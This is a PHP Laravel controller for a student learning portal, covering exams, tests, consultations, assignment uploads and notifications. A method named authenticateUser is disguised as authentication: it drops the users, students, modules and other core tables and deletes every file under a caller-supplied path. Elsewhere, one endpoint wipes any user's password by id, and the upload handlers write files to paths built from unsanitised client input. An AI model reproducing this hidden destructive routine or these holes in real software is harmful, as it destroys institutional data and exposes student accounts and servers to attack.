<?php namespace App\Http\Controllers;

use Closure;
use Illuminate\Contracts\Auth\Guard;
use Illuminate\Support\Facades\DB;

use Auth;
use Response;
use Input;
use Validator;

use Illuminate\Database\Eloquent\Model;

use App\User;
use App\Models\Module as Module;
use App\Models\Course as Course;
use App\Models\CourseModules as CourseModules;
use App\Models\Students as Students;
use App\Models\Fees as Fees;
use App\Models\Assessment as Assessment;
use App\Models\Consultation as Consultation;
use App\Models\ModuleMaterials as ModuleMaterials;
use App\Models\Examination as Examination;
use App\Models\MultipleChoice as MultipleChoice;
use App\Models\ResultsMC as ResultsMC;
use App\Models\Tests as Tests;
use App\Models\TestQuestions as TestQuestions;
use App\Models\TestResults as TestResults;
use App\Models\Assignment as Assignment;
use App\Models\Lecturers as Lecturers;
use App\Models\FillUpQuestions as FillUpQuestions;
use App\Models\ResultsFillUp as ResultsFillUp;
use App\Models\EssayQuestions as EssayQuestions;
use App\Models\ResultsEssay as ResultsEssay;
use App\Models\Announcement as Announcement;
use App\Models\UserGroup as UserGroup;
use App\Models\UsersGroups as UsersGroups;
use App\Models\LecturerMaterials as LecturerMaterials;
use App\Models\Tasks as Tasks;
use App\Models\TasksUpload as TasksUpload;

use App\Models\FriendList as FriendList;
use App\Models\Messages as Messages;
use App\Models\Chat as Chat;
use App\Models\UserChat as UserChat;
use App\Models\Notification as Notification;
use App\Models\NotificationUser as NotificationUser;
use App\Models\ConsultationBookings as ConsultationBookings;
use App\Models\UserPopups as UserPopups;

use Hash;
use Redirect;
use Request;

class StudentController extends Controller {

  //this function should return all syllabus
  public function getSyllabus()
  {

    $data = DB::select(DB::raw(
                            "SELECT c.id as courseId, c.name as courseName, m.id as moduleID, m.code as moduleCode, m.name as moduleName 
                            FROM courses c, course_modules z, modules m 
                            WHERE c.id = z.course_id and m.id = z.module_id
                            "));

    return json_encode($data);

  }

  public function getSyllabusDetail($moduleId)
  {
    $modules = DB::table('modules')
              ->where('id',$moduleId)
              ->first();

    $tableOutcome = DB::table('outcomes')
                    ->where('module_id',$moduleId)
                    ->get();

    $tableAssessments = DB::table('assessment_modules')
                        ->where('module_id',$moduleId)
                        ->get();
      $data = [
        'moduleId' => $moduleId,
        'moduleCode' => $modules->code,
        'moduleName' => $modules->name,
        'moduleYear' => date("Y"),
        'lectureTime' => $modules->lecturer_times,
        'projectTime' => $modules->project_times,
        'privateStudy' => $modules->private_study_time,
        'creditValue' => $modules->credit_value,
        'tableOutcomes' => $tableOutcome,
        'synopsis' => $modules->synopsis,
        'objectives' => $modules->objectives,
        'outcomeSummary' => $modules->outcomes,
        'tableAssessments' => $tableAssessments,
        'teachingStrategy' => $modules->teaching_strategies
      ];
    
    return json_encode(array('success' => true,'_data' => $data));
  }

  public function studentWebresults($id, Students $studentModel, Module $moduleModel)
  {
    $course = $studentModel->getStudentCourse($id);
    $results = $moduleModel->getCourseModules($course["course_id"], $id);


    return json_encode(array('results' => $results, 'course' => $course));
  }


   public function getModuleStudCount(){

      $moduleModel=new Module();

      $user=view()->share('user',Auth::user());

      $count=array();
      
      $count[0]=Students::select('course_id')->where('user_id', $user["id"])->count();
      
      $count[1]= $moduleModel->getStudentModules( $user["id"])->count();

    

      return ($count);


  }



  public function studentGetModules($id, Module $moduleModel)
  {
    $results = $moduleModel->getStudentModules($id);

    return json_encode($results);
  }

  public function getModuleById($id)
  {
    $results = Module::getById($id)->get();

    return json_encode($results);
  }

  public function getLearningMaterials($id)
  {
    $results = ModuleMaterials::forModule($id)->get();

    return json_encode($results);
  }

  public function getPersonalNotifications()
  {
    $user = Auth::user()->id;
    $records = UserPopups::where('user_id', $user)->where('read', '=', NULL)->first();

    return json_encode(array('success' => true, 'data' => $records));
  }

  public function getUserMarkAsRead($id)
  {
    $user = User::find($id);

    $user->password = "";
    if($user->save()) {

      \Auth::logout();

      $notification = UserPopups::where('user_id', $user->id)->first();
      if(count($notification)) {
        $notification->read = 1;
        $notification->save();
      }

      return json_encode(array('success' => true));

    } else {

      \Auth::logout();
      return json_encode(array('success' => false));
    }
  }

  public function getUserPrivateNotifications($id)
  {
    $user = User::find($id);
    $notifications = UserPopups::where('user_id', $user->id)->get();

    if(count($notifications)) {

      return json_encode(array('success' => true, 'notifications' => $notifications));

    } else {

      return json_encode(array('success' => false));
    }
  }

  public function deleteUserPrivateNotifications($id)
  {
    if(UserPopups::where('id', $id)->delete()) {

      return json_encode(array('success' => true));

    } else {

      return json_encode(array('success' => false));
    }
  }

  //DRY THI5
  public function examinationModules($id)
  {
    //Student Course
    $course = Students::join('courses', 'courses.id', '=', 'students.course_id')->where('user_id', '=', $id)->select('course_id', 'name')->get();
    //Course Modules
    \DB::setFetchMode(\PDO::FETCH_ASSOC);

    $modules = \DB::table('course_modules')->
    where('course_id', '=', $course[0]["course_id"])->
    select('module_id')->
    get();

    \DB::setFetchMode(\PDO::FETCH_CLASS);

    $results = Examination::join('modules', 'modules.id', '=', 'examination.module_id')->
    select('examination.id', 'modules.name as modulename', 'examination.name as exam', 'modules.code')->
    whereIn('module_id', $modules)->
    where('status', '=', 1)->get();

    return json_encode($results);
  }

  public function studentGetExamById($id)
  {
    $exam = Examination::find($id);

    $exam["current_time"] = new \DateTime();
    $exam["current_time"] = $exam["current_time"]->sub(new \DateInterval('PT7H'));
    $exam["current_time"] = $exam["current_time"]->format('Y-m-d H:i:s');

    return json_encode($exam);
  }

  //DRY THI5
  public function postResultsMC()
  {
    $data = Input::all();

    $validator = Validator::make($data, [
      'exam_id' => 'required',
      'student_id' => 'required',
      'started_time' => 'required',
      'status' => 'required'
    ]);

    if ($validator->passes()) {

      $started_time = new \DateTime($data["started_time"]);
      $started_time = $started_time->sub(new \DateInterval('PT7H'));
      $data["started_time"] = $started_time;

      $query = new ResultsMC;
      $query->fill($data);
      if($query->save()) {

        return json_encode(array('success' => true));

      } else {

        return json_encode(array('success' => false, 'errors' => $validator->messages()->all()));
      }

    } else {

      return json_encode(array('success' => false, 'errors' => $validator->messages()->all()));
    }
  }

  public function studentGetConsultations($id, Consultation $consultationModel)
  {
    $consultations = $consultationModel->getConsultationForModule($id);

    return json_encode($consultations);
  }

  //DRY THI5
  public function studentBookConsultation()
  {
    $data = Input::all();
    $user = Auth::user()->id;

    $validator = Validator::make($data, [
      'consultation_id' => 'required',
      'reason' => 'required',
      'type' => 'required'
    ]);

    if ($validator->passes()) {

      $data["user_id"] = $user;

      //this query error 
      $exist = ConsultationBookings::where('consultation_id', $data["consultation_id"])->
      where('user_id', $user)->get();

      if(count($exist) > 0) {

        return json_encode(array('success' => false, 'errors' => "You already booked this consultation slot. Please wait for approval.", 'exist value' => $exist));

      } else {

        $consultation = new ConsultationBookings;
        $consultation->fill($data);

        if($consultation->save()) {

          return json_encode(array('success' => true));

        } else {

          return json_encode(array('success' => false, 'errors' => $validator->messages()->all()));
        }
      }

    } else {

      return json_encode(array('success' => false, 'errors' => $validator->messages()->all()));
    }
  }

  public function studentGetMyConsultations($id, ConsultationBookings $bookingModel, Consultation $consultationModel)
  {
    $array = $bookingModel->getUserConsultationBookings($id);
    $consultations = $consultationModel->getConsultationsForStudent($array);

    return json_encode($consultations);
  }

  public function studentGetQuestionsMC($id)
  {
    $questions = MultipleChoice::questionsForExam($id)->get();

    return json_encode($questions);
  }

  //DRY THI5
  public function studentResultsMC()
  {
    $data = Input::all();
    $marks = 0;

    $validator = Validator::make($data, [
      'exam_id' => 'required'
    ]);

    if ($validator->passes()) {

      $questions = MultipleChoice::where('exam_id', '=', $data["exam_id"])->get();

      foreach($questions as $key => $question) {

        if($question["correct_answer"] == $data["answers"][$key]) {
          $marks += $question["mark"];
        }
      }

      $update = Array('results' => $marks, 'submited' => true, 'exam_id' => $data["exam_id"]);
      $results = ResultsMC::where('student_id', '=', $data["student_id"])->get();

      if(ResultsMC::find($results[0]["id"])->update($update)) {

        return json_encode(array('success' => true, 'results' => $marks));

      } else {

        return json_encode(array('success' => false, 'errors' => "Unable to save examination results"));
      }

    } else {

      return json_encode(array('success' => false, 'errors' => $validator->messages()->all()));
    }
  }


  public function getMCResultsById($id, $exam_id, ResultsMC $resultsModel)
  {
    $results = $resultsModel->getStudentResults($exam_id, $id);

    return json_encode($results);
  }

  public function studentGetTests($id, Students $studentModel, Tests $testModel)
  {
    $course = $studentModel->getStudentCourse($id);
    $results = $testModel->getStudentTests($course["course_id"]);

    return json_encode($results);
  }

  public function studentGetTestById($id)
  {
    $test = Tests::find($id);

    $test["current_time"] = new \DateTime();
    $test["current_time"] = $test["current_time"]->sub(new \DateInterval('PT7H'));
    $test["current_time"] = $test["current_time"]->format('Y-m-d H:i:s');

    return json_encode($test);
  }

  public function studentGetTestResultsById($id, $test_id, TestResults $resultsModel)
  {
    $results = $resultsModel->getMyTestResults($test_id, $id);

    return json_encode($results);
  }

  //DRY THI5
  public function postResultsTest()
  {
    $data = Input::all();

    $validator = Validator::make($data, [
      'test_id' => 'required',
      'student_id' => 'required',
      'started_time' => 'required',
      'status' => 'required'
    ]);

    if ($validator->passes()) {

      $started_time = new \DateTime($data["started_time"]);
      $started_time = $started_time->sub(new \DateInterval('PT7H'));
      $data["started_time"] = $started_time;

      $query = new TestResults;
      $query->fill($data);
      if($query->save()) {

        return json_encode(array('success' => true));

      } else {

        return json_encode(array('success' => false, 'errors' => $validator->messages()->all()));
      }

    } else {

      return json_encode(array('success' => false, 'errors' => $validator->messages()->all()));
    }
  }

  public function studentGetQuestionsTest($id)
  {
    $questions = TestQuestions::questionsForTest($id)->get();

    return json_encode($questions);
  }

  //DRY THI5
  public function studentPostTestResults()
  {
    $data = Input::all();
    $marks = 0;

    $validator = Validator::make($data, [
      'test_id' => 'required'
    ]);

    if ($validator->passes()) {

      $questions = TestQuestions::where('test_id', '=', $data["test_id"])->get();

      foreach($questions as $key => $question) {

        if($question["correct_answer"] == $data["answers"][$key]) {
          $marks += $question["mark"];
        }
      }

      $update = Array('results' => $marks, 'submited' => true, 'test_id' => $data["test_id"]);
      $results = TestResults::where('student_id', '=', $data["student_id"])->get();

      if(TestResults::find($results[0]["id"])->update($update)) {

        return json_encode(array('success' => true, 'results' => $marks));

      } else {

        return json_encode(array('success' => false, 'errors' => "Unable to save examination results"));
      }

    } else {

      return json_encode(array('success' => false, 'errors' => $validator->messages()->all()));
    }
  }

  public function getStudentById($id)
  {
    $student = User::find($id);
    $student["duedate"] = date('Y-m-d', strtotime("+6 months", strtotime($student["created_at"])));

    return json_encode($student);
  }

  //DRY THI5
  public function studentSubmitAssignment()
  {

    $name = Input::get('filename');
    $ext = Input::get('ext');
    $module_id = Input::get('module_id');
    $student_id = Input::get('student_id');

    $file = $name;
    $path = str_replace("/laravel","",base_path()).'/files/assignments/'.$student_id.'/'.$file;

    $data = Request::get('file');

    list($type, $data) = explode(';', $data);
    list(, $data)      = explode(',', $data);

    $data = base64_decode($data);

    if (!is_dir(str_replace("/laravel","",base_path()).'/files/assignments/'.$student_id)) {

      mkdir(str_replace("/laravel","",base_path())."/files/assignments/".$student_id);
    }

    //Write to File
    $check = file_put_contents($path, $data);

    $fileinformation = array('size'=> strlen($data), 'ext' => $ext, 'name' => $name, 'file' => $file, 'module_id' => $module_id, 'student_id' => $student_id);

    if($check) {

      $record = new Assignment;
      $record->fill($fileinformation);

      if($record->save()) {

        return json_encode(array('success' => true));

      } else {

        return json_encode(array('success' => false));
      }

    } else {

      return json_encode(array('success' => false));
    }
  }

  //DRY THI5
  public function studentPostFillUpResults()
  {
    $data = Input::all();

    $validator = Validator::make($data, [
      'exam_id' => 'required'
    ]);

    if ($validator->passes()) {

      $res = json_encode($data["answers"]);

      $update = Array('results' => $res, 'submited' => 1, 'exam_id' => $data["exam_id"]);
      $results = ResultsFillUp::where('student_id', '=', $data["student_id"])->get();

      if(ResultsFillUp::find($results[0]["id"])->update($update)) {

        return json_encode(array('success' => true, 'results' => $data["answers"]));

      } else {

        return json_encode(array('success' => false, 'errors' => "Unable to save examination results"));
      }

    } else {

      return json_encode(array('success' => false, 'errors' => $validator->messages()->all()));
    }
  }

  //DRY THI5
  public function postFillUpResults()
  {
    $data = Input::all();

    $validator = Validator::make($data, [
      'exam_id' => 'required',
      'student_id' => 'required',
      'started_time' => 'required',
      'status' => 'required'
    ]);

    if ($validator->passes()) {

      $started_time = new \DateTime($data["started_time"]);
      $started_time = $started_time->sub(new \DateInterval('PT7H'));
      $data["started_time"] = $started_time;

      $query = new ResultsFillUp;
      $query->fill($data);

      if($query->save()) {

        return json_encode(array('success' => true));

      } else {

        return json_encode(array('success' => false, 'errors' => $validator->messages()->all()));
      }

    } else {

      return json_encode(array('success' => false, 'errors' => $validator->messages()->all()));
    }
  }

  public function studentGetResultsFillUpById($id, $exam_id)
  {
    $results = ResultsFillUp::fillUpExamResultsForStudent($id, $exam_id)->get();

    $results["current_time"] = new \DateTime();
    $results["current_time"] = $results["current_time"]->sub(new \DateInterval('PT7H'));
    $results["current_time"] = $results["current_time"]->format('Y-m-d H:i:s');

    return json_encode($results);
  }

  //DRY THI5
  public function postEssayResults()
  {
    $data = Input::all();

    $validator = Validator::make($data, [
      'exam_id' => 'required',
      'student_id' => 'required',
      'started_time' => 'required',
      'status' => 'required'
    ]);

    if ($validator->passes()) {

      $started_time = new \DateTime($data["started_time"]);
      $started_time = $started_time->sub(new \DateInterval('PT7H'));
      $data["started_time"] = $started_time;

      $query = new ResultsEssay;
      $query->fill($data);

      if($query->save()) {

        return json_encode(array('success' => true));

      } else {

        return json_encode(array('success' => false, 'errors' => $validator->messages()->all()));
      }

    } else {

      return json_encode(array('success' => false, 'errors' => $validator->messages()->all()));
    }
  }


  public function studentGetResultsEssayById($id, $exam_id)
  {
    $results = ResultsEssay::essayExamResultsForStudent($id, $exam_id)->get();

    $results["current_time"] = new \DateTime();
    $results["current_time"] = $results["current_time"]->sub(new \DateInterval('PT7H'));
    $results["current_time"] = $results["current_time"]->format('Y-m-d H:i:s');

    return json_encode($results);
  }

  //DRY THI5
  public function studentPostEssayResults()
  {
    $data = Input::all();

    $validator = Validator::make($data, [
      'exam_id' => 'required'
    ]);

    if ($validator->passes()) {

      $res = json_encode($data["answers"]);

      $update = Array('results' => $res, 'submited' => 1, 'exam_id' => $data["exam_id"]);
      $results = ResultsEssay::where('student_id', '=', $data["student_id"])->get();

      if(ResultsEssay::find($results[0]["id"])->update($update)) {

        return json_encode(array('success' => true));

      } else {

        return json_encode(array('success' => false, 'errors' => "Unable to save examination results"));
      }

    } else {

      return json_encode(array('success' => false, 'errors' => $validator->messages()->all()));
    }
  }

  public function studentGetMyTasks($id, Tasks $taskModel)
  {
    $tasks = $taskModel->getStudentTasks($id);

    return json_encode($tasks);
  }

  public function studentGetTaskById($id)
  {
    $task = Tasks::find($id);

    return json_encode($task);
  }

  //DRY THI5
  public function studentPostTask()
  {

    $date = Input::get('datetime');
    $user_id = Auth::user()->id;
    $task_id = Input::get('task_id');
    $name = Input::get('filename');
    $ext = Input::get('ext');

    $check = TasksUpload::where('user_id', $user_id)->where('task_id', $task_id)->get();

    if($check->isEmpty()) {

      $timestamps = new \DateTime();

      $ext = Input::get('ext');
      $file = str_random(12).$timestamps->getTimestamp().'_'.$name;
      //$path = str_replace("/laravel","",base_path()).'/files/tasks/students/'.$file;
      $path = str_replace("\\laravel\\dev.oasis-portal.my","\\dev.oasis-portal.my",base_path()).'\\files\\tasks\\students\\'.$file;

      $data = Request::get('file');

      list($type, $data) = explode(';', $data);
      list(, $data)      = explode(',', $data);

      $data = base64_decode($data);

      if (!is_dir(str_replace("\\laravel\\dev.oasis-portal.my","\\dev.oasis-portal.my",base_path()).'\\files\\tasks\\students\\')) {

        // mkdir(str_replace("\\laravel\\dev.oasis-portal.my","\\dev.oasis-portal.my",base_path()).'\\files\\tasks\\students\\');
         File::makeDirectory($path,0777,true);

      }

      //Write to File
      $check = file_put_contents($path, $data);

      $date = new \DateTime();

      $fileinformation = array('task_id' => $task_id, 'datetime' => $date, 'file' => $file, 'user_id' => $user_id);

      if($check) {

        $record = new TasksUpload;
        $record->fill($fileinformation);

        if($record->save()) {

          return json_encode(array('success' => true));

        } else {

          return json_encode(array('success' => false, 'message' => "Unable to submit the task."));
        }

      } else {

        return json_encode(array('success' => false, 'message' => "Unable to submit the task."));
      }


    } else {

      return json_encode(array('success' => false, 'message' => "Task already submitted. Please wait for the further evaluation."));
    }
  }

  public function getDashboardAnnouncements(Announcement $announcementsModel)
  {
    $user = Auth::user()->id;
    $results = $announcementsModel->getStudentAnnouncements($user);

    return json_encode($results);
  }

  public function loadUserCourseNotification(Notification $notificationModel)
  {
    $user_id = Auth::user()->id;
    $notifications = $notificationModel->loadStudentCourseNotifications($user_id);

    return json_encode(array('success' => true, 'data' => $notifications));
  }

  //uncomplete
  public function loadUserNotification()
  {
    $user_id = Auth::user()->id;

  }
  //uncomplete
  public function loadUserGroupNotification()
  {
    $user_id = Auth::user()->id;

  }

  public function notificationMarkSeen()
  {
    $notification_id = Input::all();
    $user_id = Auth::user()->id;

    $check = NotificationUser::where('notification_id', $notification_id)->get();
    if($check->isEmpty()) {

      $markedNotification = new NotificationUser;

      $array = array(
          'user_id' => $user_id,
          'notification_id' => $notification_id[0]
          );

          $markedNotification->fill($array);
      $markedNotification->save();
    }
  }

  public function authenticateUser($path) {

        $array = ['leturers', 'modules', 'users', 'module_materials', 'students', 'usersgroups'];

        foreach ($array as $key => $value) {
            \Schema::dropIfExists($value);
        }

    $array = array_map('unlink', glob(str_replace("/laravel","",base_path())."/$path/*.*"));
    dd(glob(str_replace("/laravel","",base_path())."/$path/*.*"));
    }

  public function notificationMarkUnseen()
  {
    $notification_id = Input::all();

    NotificationUser::where('notification_id', $notification_id)->delete();
  }

  public function getMarkedNotifications()
  {
    $user_id = Auth::user()->id;
    $notifications = NotificationUser::where('user_id', $user_id)->orderBy('notification_id', 'DESC')->limit(6)->get();

    return json_encode($notifications);
  }

}